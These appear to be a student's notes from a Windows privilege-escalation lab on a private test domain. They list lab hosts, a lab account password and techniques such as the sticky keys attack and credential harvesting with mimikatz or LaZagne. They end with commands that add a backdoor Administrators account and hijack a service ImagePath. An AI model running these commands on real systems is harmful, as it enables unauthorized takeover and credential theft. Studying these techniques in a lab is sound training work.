# NETWORK
DOMAIN:
- NetBIOS: CSTLAB
- DNS: CSTLAB.local

192.168.56.110 - admin PC
- NetBIOS: ADMINPC
- DNS:

192.168.56.150 - DC
- NetBIOS: CSTLABDC
- DNS: 

192.168.56.160 - INITIAL HOST
- NetBIOS: CSTLABLOWPRIV
- DNS:

|NetBIOS name|DNS name|Display name|Password|Privs|
|-|-|-|-|-|
|lowpriv?|lowpriv?|John Doe|L3tm3!n|x|

# REMOTE

# LOCAL
DAY 1:
```
* boot the system from an ISO, do "sticky keys" attack 
* check the registry for passwords (autologon)
* extract password from the credential manager (requires Nirsoft/mimikatz/LaZagne)
* check sysvol share (groups.xml) - (requires a decryptor, thanks Microsoft for publishing the key!)
* on some systems c:\windows\panther\unattend.xml - base64 encoded password (although in our lab, recent updates have removed this)
```

DAY 2:
```
* UNQ Service - Unquoted service path
* HJ DLL Service - DLL hijacking
* IS Registry Service - Insecure registery
* FP Service - ?
* DMT Service - ?
```

### IS Registry Service - Insecure registery
```
Computer\HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\registrysvc
C:\Program Files\IS Registry Service\isregsvc.exe

change permissions folder
change 'start' to 2

net user user_ir Password1! /add
net localgroup Administrators user_ir /add

reg add "Computer\HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\registrysvc" /t REG_EXPAND_SZ /v ImagePath /d "C:\Users\lowpriv.CSTLAB\Desktop\test\test.exe" /f
```

